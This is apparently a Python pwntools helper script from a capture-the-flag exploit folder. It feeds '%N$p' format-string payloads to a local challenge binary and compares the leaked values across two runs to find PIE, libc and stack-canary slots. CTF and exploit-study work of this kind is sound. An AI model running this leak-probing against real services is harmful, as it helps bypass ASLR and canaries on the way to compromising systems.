from pwn import *

# gosip leak-slot discovery — kanari-style, two fresh instances per slot.
#
# how to read the table:
#   SUBPAGE-MATCH (same last 3 hex digits, different value) = slot holds a
#       module pointer -> ASLR randomizes pages, not offsets:
#         0x5.......  = binary (PIE)      0x7.......  = libc / stack / ld
#   two random-looking values, one ending 00 = per-run canary
#   identical values = constants / env junk
#
# a slot can move when the libc build changes (seen live: &main was %29$p on
# host glibc 2.39, %27$p on the shipped trixie 2.41) — rerun this whenever
# solver.py's leak validation complains on a new box.

import sys

context.log_level = 'error'
context.binary = elf = ELF('../source/chall', checksec=False)

LD = '../source/ld-linux-x86-64.so.2'

def one(fmt: bytes) -> str:
    io = process([LD, elf.path], env={'LD_LIBRARY_PATH': '../source'})
    io.recvuntil(b'who are you?\n')
    io.sendline(b'name')
    io.recvuntil(b"won't tell anyone.\n")
    io.sendline(fmt)
    io.recvuntil(b'well:\n')
    out = io.recvline().decode(errors='replace').strip()
    io.close()
    return out

if __name__ == '__main__':
    lo = int(sys.argv[1]) if len(sys.argv) > 1 else 21
    hi = int(sys.argv[2]) if len(sys.argv) > 2 else 41
    for n in range(lo, hi):
        try:
            a = one(('%{}$p'.format(n)).encode())
            b = one(('%{}$p'.format(n)).encode())
            va, vb = int(a, 16), int(b, 16)
            subpage = va != vb and (va & 0xfff) == (vb & 0xfff)
            tag = ''
            if subpage:
                tag = 'SUBPAGE-MATCH'
                if va < 0x700000000000:
                    tag += ' (binary/PIE family)'
            elif va == vb:
                tag = 'constant'
            marker = ''
            if not subpage and va != vb and va & 0xff == 0 and vb & 0xff == 0:
                marker = ' <~ canary?'
            print('%2d  A=%-20s B=%-20s %s%s' % (n, a, b, tag, marker))
        except (EOFError, ValueError, PwnlibException) as e:
            print('%2d  ERR %s' % (n, e))
